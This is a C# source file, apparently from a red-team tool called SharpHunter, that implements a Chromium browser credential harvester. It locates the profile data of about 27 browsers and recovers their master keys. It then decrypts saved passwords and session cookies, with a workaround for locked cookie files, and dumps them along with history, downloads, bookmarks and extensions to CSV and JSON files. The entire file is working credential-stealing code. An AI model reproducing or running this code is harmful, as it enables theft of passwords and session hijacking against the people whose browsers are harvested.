using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using SharpHunter.Utils;
using System.Web.Script.Serialization;

namespace SharpHunter.Commands
{
    public class ChromiumCredCommand : ICommand
    {
        private static byte[] masterKeyV10;
        private static byte[] masterKeyV20;

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting credentials from Chromium-based browsers.");
            GetChromiumCred();
        }

        public static readonly Dictionary<string, string> BrowserDataPaths = new Dictionary<string, string>
        {
            { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data") },
            { "Chrome Beta",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome Beta\\User Data" )},
            { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Chromium\\User Data" )} ,
            { "Chrome SxS", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome SxS\\User Data" )},
            { "Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Microsoft\\Edge\\User Data") } ,
            { "Brave-Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"BraveSoftware\\Brave-Browser\\User Data") } ,
            { "QQBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tencent\\QQBrowser\\User Data") } ,
            { "SogouExplorer", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sogou\\SogouExplorer\\User Data") } ,
            { "360SpeedX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"360ChromeX\\Chrome\\User Data" )} ,
            { "360Speed",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "360Chrome\\Chrome\\User Data") } ,
            { "Vivaldi",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi\\User Data") } ,
            { "CocCoc", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"CocCoc\\Browser\\User Data" )},
            { "Torch", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Torch\\User Data" )},
            { "Kometa", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Kometa\\User Data" )},
            { "Orbitum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Orbitum\\User Data" )},
            { "CentBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser\\User Data" )},
            { "7Star", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"7Star\\7Star\\User Data" )},
            { "Sputnik", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sputnik\\Sputnik\\User Data" )},
            { "Epic Privacy Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Epic Privacy Browser\\User Data" )},
            { "Uran",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia\\Uran\\User Data" )},
            { "Yandex", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Yandex\\YandexBrowser\\User Data" )},
            { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Iridium\\User Data" )},
            { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
            { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
            { "The World", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"theworld6\\User Data" )},
            { "Lenovo", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Lenovo\\SLBrowser\\User Data" )},
            { "DCBrowser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"DCBrowser\\User Data" )},
        };

        public struct LoginInfo
        {
            public string Username;
            public string Password;
            public string OriginUrl;
        }

        public struct CookieInfo
        {
            public string Domain;
            public double ExpirationDate;
            public bool HostOnly;
            public bool HttpOnly;
            public string Name;
            public string Path;
            public string SameSite;
            public bool Secure;
            public bool Session;
            public string StoreId;
            public string Value;
        }

        public struct HistoryInfo
        {
            public string Url;
            public string Title;
            public DateTime LastVisitTime;
        }

        public struct DownloadInfo
        {
            public string Url;
            public string Path;
            public DateTime LastAccessTime;
        }

        public struct BookmarkInfo
        {
            public string FolderPath;
            public string Name;
            public string Url;
        }

        public struct ExtensionInfo
        {
            public string Id;
            public string Name;
        }

        public class Child
        {
            public string date_added { get; set; }
            public string guid { get; set; }
            public string id { get; set; }
            public string name { get; set; }
            public string type { get; set; }
            public string url { get; set; }
            public List<Child> children { get; set; } 
        }

        public class RootObject
        {
            public string checksum { get; set; }
            public Dictionary<string, Children> roots { get; set; }
            public int version { get; set; }
        }

        public class Children
        {
            public List<Child> children { get; set; }
        }

        public static void GetChromiumCred()
        {
            foreach (var browser in BrowserDataPaths)
            {
                string browserName = browser.Key;
                string browserPath = browser.Value;
                if (!Directory.Exists(browserPath))
                    continue;
                Logger.TaskHeader($"Hunting {browserName}", 1);
                Logger.WriteLine($"[*] {browserName}Path: {browserPath}");

                var masterKey = ChromiumDecryption.GetChromiumMasterKey(browserPath);
                masterKeyV10 = masterKey.MasterKey_v10;
                masterKeyV20 = masterKey.MasterKey_v20;

                if (masterKeyV10 == null && masterKeyV20 == null)
                {
                    Logger.WriteLine($"[-] No master key found for {browserName}.");
                    continue;
                }
                List<string> profilesList = new List<string> { "Default" };
                List<string> dirs = Directory.GetDirectories(browserPath).ToList();
                for (int i = 1; i < 100; i++)
                {
                    string profileName = "Profile " + i;
                    if (dirs.Contains(Path.Combine(browserPath, profileName)))
                    {
                        profilesList.Add(profileName);
                    }
                }

                foreach (var profile in profilesList)
                {
                    string profilePath = Path.Combine(browserPath, profile); 
                    string browserDirectory = Path.Combine(Logger.globalLogDirectory, browserName);

                    Logger.TaskHeader($"{browserName}({profile})", 2);
                    List<LoginInfo> loginInfos = ExtractLoginData(profilePath);
                    if (loginInfos != null && loginInfos.Count > 0)
                    {
                       Logger.WriteLine($"[*] Hunted {loginInfos.Count} passwords from {browserName} ({profile})");
                       Logger.WriteStructsToCsv(loginInfos, browserDirectory, $"{browserName}_{profile}_passwords.csv");
                    }
                    List<CookieInfo> cookieInfos = ExtractCookieData(profilePath, browserName);
                    if (cookieInfos != null && cookieInfos.Count > 0)
                    {
                        Logger.WriteLine($"[*] Hunted {cookieInfos.Count} cookies from {browserName} ({profile})");
                        Logger.WriteStructsToJson(cookieInfos, browserDirectory, $"{browserName}_{profile}_cookies.json");
                    }
                    List<HistoryInfo> historyInfos = ExtractHistoryData(profilePath, browserName);
                    if (historyInfos != null && historyInfos.Count > 0)
                    {
                       Logger.WriteLine($"[*] Hunted {historyInfos.Count} histroys from {browserName} ({profile})");
                       Logger.WriteStructsToCsv(historyInfos, browserDirectory, $"{browserName}_{profile}_historys.csv");
                    }
                    List<DownloadInfo> downloadInfos = ExtractDownloadData(profilePath, browserName);
                    if (downloadInfos != null && downloadInfos.Count > 0)
                    {
                       Logger.WriteLine($"[*] Hunted {downloadInfos.Count} downloads from {browserName} ({profile})");
                       Logger.WriteStructsToCsv(downloadInfos, browserDirectory, $"{browserName}_{profile}_downloads.csv");
                    }
                    List<BookmarkInfo> bookmarkInfos = ExtractBookmarkData(profilePath);
                    if (bookmarkInfos != null && bookmarkInfos.Count > 0)
                    {
                       Logger.WriteLine($"[*] Hunted {bookmarkInfos.Count} bookmarks from {browserName} ({profile})");
                       Logger.WriteStructsToCsv(bookmarkInfos, browserDirectory, $"{browserName}_{profile}_bookmarks.csv");
                    }
                    List<ExtensionInfo> extensionInfos = ExtractExtensionData(profilePath);
                    if (extensionInfos != null && extensionInfos.Count > 0)
                    {
                        Logger.WriteLine($"[*] Hunted {extensionInfos.Count} extensions from {browserName} ({profile})");
                        Logger.WriteStructsToCsv(extensionInfos, browserDirectory, $"{browserName}_{profile}_extensions.csv");
                    }
                }

            }
        }

        private static byte[] DecryptData(byte[] buffer)
        {
            if (buffer == null || buffer.Length == 0 || (masterKeyV10 == null && masterKeyV20 == null))
                return null;

            try
            {
                string bufferString = Encoding.UTF8.GetString(buffer);

                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11") || bufferString.StartsWith("v20"))
                {
                    byte[] masterKey = bufferString.StartsWith("v20") ? masterKeyV20 : masterKeyV10;
                    if (masterKey == null)
                        return null;

                    if (buffer.Length < 15) 
                        return null;

                    byte[] iv = buffer.Skip(3).Take(12).ToArray();
                    byte[] cipherText = buffer.Skip(15).ToArray();
                    
                    if (cipherText.Length < 16) 
                        return null;

                    byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                    byte[] data = cipherText.Take(cipherText.Length - 16).ToArray();

                    if (data.Length == 0)
                        return null;

                    try
                    {
                        byte[] decryptedData = new AesGcm().Decrypt(masterKey, iv, null, data, tag);
                        return bufferString.StartsWith("v20") ? decryptedData.Skip(32).ToArray() : decryptedData;
                    }
                    catch
                    {
                        return null;
                    }
                }
                else
                {
                    try
                    {
                        return ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                    }
                    catch
                    {
                        return null;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] DecryptData error: {ex.Message}");
                return null;
            }
        }
        private static List<LoginInfo> ExtractLoginData(string browserPath)
        {
            List<LoginInfo> loginInfos = new List<LoginInfo>();
            string loginDataPath = Path.Combine(browserPath, "Login Data");

            if (!File.Exists(loginDataPath))
                return loginInfos;

            string tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(loginDataPath, tempFile, true);
                SQLiteHandler sqlHandler = new SQLiteHandler(tempFile);
                if (sqlHandler.ReadTable("logins"))
                {
                    for (int i = 0; i < sqlHandler.GetRowCount(); i++)
                    {
                        string originUrl = sqlHandler.GetValue(i, "origin_url");
                        string username = sqlHandler.GetValue(i, "username_value");
                        string password_value = sqlHandler.GetValue(i, "password_value"); 

                        if (string.IsNullOrEmpty(password_value))
                            continue;

                        byte[] encryptedPasswordBytes = Convert.FromBase64String(password_value);
                        byte[] decryptedBytes = DecryptData(encryptedPasswordBytes);

                        if (decryptedBytes == null || decryptedBytes.Length == 0)
                            continue;

                        string password = Encoding.UTF8.GetString(decryptedBytes);
                        string finalUsername = string.IsNullOrEmpty(username) ? "N/A" : username;

                        loginInfos.Add(new LoginInfo
                        {
                            OriginUrl = originUrl,
                            Username = finalUsername,
                            Password = password
                        });
                    }
                }
            }
            catch (Exception)
            {
            }
            finally
            {
                File.Delete(tempFile);
            }

            return loginInfos;
        }

        private static List<CookieInfo> ExtractCookieData(string profilePath, string browserName)
        {
            List<CookieInfo> cookieInfos = new List<CookieInfo>();
            string cookieDataPath = Path.Combine(profilePath, "Cookies");
            string networkCookieDataPath = CommonUtils.CombinePaths(profilePath, "Network", "Cookies");

            if (!File.Exists(cookieDataPath) && File.Exists(networkCookieDataPath))
            {
                cookieDataPath = networkCookieDataPath;
            }

            if (!File.Exists(cookieDataPath))
                return cookieInfos;

            string tempFile = Path.GetTempFileName();
            try
            {
                try
                {
                    File.Copy(cookieDataPath, tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(cookieDataPath);
                    if (ckfile != null)
                    {
                        File.WriteAllBytes(tempFile, ckfile);
                    }
                }

                SQLiteHandler sqlHandler = new SQLiteHandler(tempFile);
                if (sqlHandler.ReadTable("cookies"))
                {
                    for (int i = 0; i < sqlHandler.GetRowCount(); i++)
                    {
                        string domain = sqlHandler.GetValue(i, "host_key");
                        long expDate;
                        double expirationDate = 0;
                        if (long.TryParse(sqlHandler.GetValue(i, "expires_utc"), out expDate))
                        {
                            expirationDate = (expDate / 1000000.0) - 11644473600;
                        }

                        string name = sqlHandler.GetValue(i, "name");
                        string encryptedValue = sqlHandler.GetValue(i, "encrypted_value");
                        string value = DecryptCookieValue(encryptedValue, name, domain);

                        cookieInfos.Add(new CookieInfo
                        {
                            Domain = domain,
                            ExpirationDate = expirationDate,
                            HostOnly = false,
                            HttpOnly = sqlHandler.GetValue(i, "is_httponly") == "1",
                            Name = name,
                            Path = sqlHandler.GetValue(i, "path"),
                            SameSite = TryParsesameSite(sqlHandler.GetValue(i, "samesite")),
                            Secure = sqlHandler.GetValue(i, "is_secure") == "1",
                            Session = sqlHandler.GetValue(i, "is_persistent") == "1",
                            StoreId = "0",
                            Value = value
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading cookie data: {ex.Message}\n");
            }
            finally
            {
                try { File.Delete(tempFile); } catch { }
            }

            return cookieInfos;
        }

        private static string DecryptCookieValue(string encryptedValue, string name, string domain)
        {
            if (string.IsNullOrEmpty(encryptedValue))
                return string.Empty;

            try
            {
                byte[] encryptedBytes;
                try
                {
                    encryptedBytes = Convert.FromBase64String(encryptedValue);
                }
                catch (FormatException)
                {
                    encryptedBytes = Encoding.UTF8.GetBytes(encryptedValue);
                }

                if (encryptedBytes == null || encryptedBytes.Length == 0)
                    return encryptedValue;

                try
                {
                    string possiblePlaintext = Encoding.UTF8.GetString(encryptedBytes);
                    if (!possiblePlaintext.StartsWith("v10") && 
                        !possiblePlaintext.StartsWith("v11") && 
                        !possiblePlaintext.StartsWith("v20"))
                    {
                        return possiblePlaintext;
                    }
                }
                catch { }

                byte[] decryptedBytes = DecryptData(encryptedBytes);
                if (decryptedBytes != null && decryptedBytes.Length > 0)
                {
                    try
                    {
                        return Encoding.UTF8.GetString(decryptedBytes);
                    }
                    catch
                    {
                        return encryptedValue;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error processing cookie value for {name} from {domain}: {ex.Message}");
            }

            return encryptedValue;
        }

        public static string TryParsesameSite(string sameSite)
        {
            if (!int.TryParse(sameSite, out int intsameSite))
            {
                return "unspecified"; 
            }

            string sameSiteString;
            switch (intsameSite)
            {
                case -1:
                    sameSiteString = "unspecified";
                    break;
                case 0:
                    sameSiteString = "no_restriction";
                    break;
                case 1:
                    sameSiteString = "lax";
                    break;
                case 2:
                    sameSiteString = "strict";
                    break;
                default:
                    sameSiteString = "unspecified"; 
                    break;
            }
            return sameSiteString;
        }
        private static List<HistoryInfo> ExtractHistoryData(string profilePath, string browserName)
        {
            List<HistoryInfo> historyInfos = new List<HistoryInfo>();
            string historyDataPath = browserName.Contains("360") ? Path.Combine(profilePath, "360History") : Path.Combine(profilePath, "History");
            if (!File.Exists(historyDataPath))
                return historyInfos;
            string tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(historyDataPath, tempFile, true);
                SQLiteHandler sqlHandler = new SQLiteHandler(tempFile);
                if (sqlHandler.ReadTable("urls"))
                {
                    for (int i = 0; i < sqlHandler.GetRowCount(); i++)
                    {
                        string url = sqlHandler.GetValue(i, "url");
                        string title = sqlHandler.GetValue(i, "title");
                        long lastVisitTimeTicks = long.Parse(sqlHandler.GetValue(i, "last_visit_time"));

                        DateTime lastVisitTime = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc)
                            .AddTicks(lastVisitTimeTicks * 10)
                            .ToLocalTime();

                        historyInfos.Add(new HistoryInfo
                        {
                            Url = url,
                            Title = title,
                            LastVisitTime = lastVisitTime
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading history data: {ex.Message}");
            }
            finally
            {
                File.Delete(tempFile);
            }

            return historyInfos;
        }

        private static List<DownloadInfo> ExtractDownloadData(string profilePath, string browserName)
        {
            List<DownloadInfo> downloadInfos = new List<DownloadInfo>();
            string historyDataPath = browserName.Contains("360") ? Path.Combine(profilePath, "360History") : Path.Combine(profilePath, "History");

            if (!File.Exists(historyDataPath))
                return downloadInfos;

            string tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(historyDataPath, tempFile, true);
                SQLiteHandler sqlHandler = new SQLiteHandler(tempFile);
                if (sqlHandler.ReadTable("downloads"))
                {
                    for (int i = 0; i < sqlHandler.GetRowCount(); i++)
                    {
                        string path = sqlHandler.GetValue(i, "current_path");
                        string url = sqlHandler.GetValue(i, "tab_url");
                        long lastAccessTimeTicks;
                        Int64.TryParse(sqlHandler.GetValue(i, "last_access_time"), out lastAccessTimeTicks);

                        DateTime lastAccessTime = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc)
                            .AddTicks(lastAccessTimeTicks * 10)
                            .ToLocalTime();

                        downloadInfos.Add(new DownloadInfo
                        {
                            Url = url,
                            Path = path,
                            LastAccessTime = lastAccessTime
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading download data: {ex.Message}");
            }
            finally
            {
                File.Delete(tempFile);
            }

            return downloadInfos;
        }

        private static List<BookmarkInfo> ExtractBookmarkData(string profilePath)
        {
            List<BookmarkInfo> bookmarkInfos = new List<BookmarkInfo>();
            string bookmarkDataPath = Path.Combine(profilePath, "Bookmarks");

            if (!File.Exists(bookmarkDataPath))
                return bookmarkInfos;

            try
            {
                string jsonContent = File.ReadAllText(bookmarkDataPath);
                JavaScriptSerializer serializer = new JavaScriptSerializer();
                var jsonObject = serializer.Deserialize<RootObject>(jsonContent);
                if (jsonObject?.roots == null)
                {
                    Logger.WriteLine("[-] 'roots' is null in the JSON object.");
                    return bookmarkInfos;
                }
                foreach (var root in jsonObject.roots)
                {
                    if (root.Value?.children != null)
                        TraverseFolders(root.Value.children, bookmarkInfos, root.Key);
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error reading bookmark data: {ex.Message}");
            }

            return bookmarkInfos;
        }

        private static void TraverseFolders(List<Child> children, List<BookmarkInfo> bookmarkInfos, string currentPath)
        {
            foreach (var child in children)
            {
                string newPath = currentPath;
                if (child.type == "folder")
                {
                    newPath = $"{currentPath}/{child.name}";
                }

                if (child.url != null)
                {
                    bookmarkInfos.Add(new BookmarkInfo
                    {
                        Name = child.name,
                        Url = child.url,
                        FolderPath = currentPath 
                    });
                }

                if (child.children != null && child.children.Count > 0)
                {
                    TraverseFolders(child.children, bookmarkInfos, newPath);
                }
            }
        }

        private static List<ExtensionInfo> ExtractExtensionData(string profilePath)
        {
            // 使用HashSet来存储唯一的扩展信息
            HashSet<ExtensionInfo> uniqueExtensions = new HashSet<ExtensionInfo>(new ExtensionInfoComparer());
            string extensionPath = Path.Combine(profilePath, "Extensions");

            if (!Directory.Exists(extensionPath))
                return new List<ExtensionInfo>();

            foreach (string extensionDir in Directory.GetDirectories(extensionPath))
            {
                foreach (string versionDir in Directory.GetDirectories(extensionDir))
                {
                    try
                    {
                        string manifest = Path.Combine(versionDir, "manifest.json");
                        if (File.Exists(manifest))
                        {
                            string jsonContent = File.ReadAllText(manifest);
                            JavaScriptSerializer serializer = new JavaScriptSerializer();
                            var manifestData = serializer.Deserialize<Dictionary<string, object>>(jsonContent);

                            if (manifestData.TryGetValue("name", out object nameObj))
                            {
                                string id = Path.GetFileName(extensionDir);
                                string name = nameObj.ToString();
                                
                                // 添加到HashSet中，自动去重
                                uniqueExtensions.Add(new ExtensionInfo
                                {
                                    Id = id,
                                    Name = name
                                });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Logger.WriteLine($"[-] Error reading extension data: {ex.Message}");
                    }
                }
            }
            return uniqueExtensions.ToList();
        }

        private class ExtensionInfoComparer : IEqualityComparer<ExtensionInfo>
        {
            public bool Equals(ExtensionInfo x, ExtensionInfo y)
            {
                if (ReferenceEquals(x, y)) return true;
                if (ReferenceEquals(x, null) || ReferenceEquals(y, null)) return false;
                return x.Id == y.Id && x.Name == y.Name;
            }

            public int GetHashCode(ExtensionInfo obj)
            {
                if (ReferenceEquals(obj, null)) return 0;
                
                unchecked
                {
                    int hashCode = 17;
                    hashCode = hashCode * 23 + (obj.Id?.GetHashCode() ?? 0);
                    hashCode = hashCode * 23 + (obj.Name?.GetHashCode() ?? 0);
                    return hashCode;
                }
            }
        }
        public static bool CheckBrowserDataPathsExist()
        {
            foreach (var browserPath in BrowserDataPaths.Values)
            {
                if (Directory.Exists(browserPath))
                {
                    return true;
                }
            }
            return false;
        }
    }
}